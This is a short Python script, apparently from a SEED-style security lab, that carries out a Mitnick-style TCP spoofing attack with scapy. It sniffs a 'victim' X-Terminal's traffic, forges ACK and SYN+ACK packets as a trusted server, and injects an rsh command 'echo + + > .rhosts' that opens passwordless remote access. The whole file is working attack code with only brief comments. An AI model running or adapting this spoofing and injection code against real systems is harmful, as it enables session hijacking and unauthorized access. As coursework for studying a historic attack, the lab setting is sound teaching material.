#!usr/bin/python3
from scapy.all import *  # used to forge and decode packets of wide number of protocols, send and capture them too
import sys

X_terminal_IP = "10.9.0.5"        #victim machine
X_terminal_Port = 514
X_terminal_Port_2 = 1023
Trusted_Server_IP = "10.9.0.6"        #kind of Shimomura's machine
Trusted_Server_Port = 1023
Trusted_Server_Port_2 = 9090

def Pkt_Spoofing(pkt):
	sequence_no = 778933536 + 1						#spoofed packet sent by the attacker
	previous_ip = pkt[IP]
	previous_tcp = pkt[TCP]
	tcp_len = previous_ip.len - previous_ip.ihl*4 - previous_tcp.dataofs*4
	print("{}:{} -> {}:{} Flags={} Len={}".format(previous_ip.src, previous_tcp.sport,
		previous_ip.dst, previous_tcp.dport, previous_tcp.flags, tcp_len))

	if previous_tcp.flags == "SA": 					#sniffing and spoofing the SYN+ACK packet from X-Terminal
		print("Sending Spoofed ACK Packet ...")
		IPLayer = IP(src=Trusted_Server_IP, dst=X_terminal_IP)    #constructed IP Header of Response
		TCPLayer = TCP(sport=Trusted_Server_Port,dport=X_terminal_Port,flags="A",
		 seq=sequence_no, ack= previous_ip.seq + 1)
		pkt = IPLayer/TCPLayer
		send(pkt,verbose=0)
		# After sending ACK packet
		print("Sending Spoofed RSH Data Packet ...")
		data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'    #rsh data
		pkt = IPLayer/TCPLayer/data
		send(pkt,verbose=0)

	if previous_tcp.flags == 'S' and previous_tcp.dport == Trusted_Server_Port_2 and previous_ip.dst == Trusted_Server_IP:
		sequence_num = 378933595
		print("2nd Connection")
		print("Sending Spoofed SYN+ACK Packet")
		IPLayer = IP(src=Trusted_Server_IP, dst=X_terminal_IP)
		TCPLayer = TCP(sport=Trusted_Server_Port_2,dport=X_terminal_Port_2,flags="SA",
		 seq=sequence_num, ack= previous_ip.seq + 1)
		pkt = IPLayer/TCPLayer
		send(pkt,verbose=0)

def main():
	pkt = sniff(iface="br-e9573b82896f", filter="tcp and src host 10.9.0.5", prn=Pkt_Spoofing)

if __name__ == "__main__":
	main()


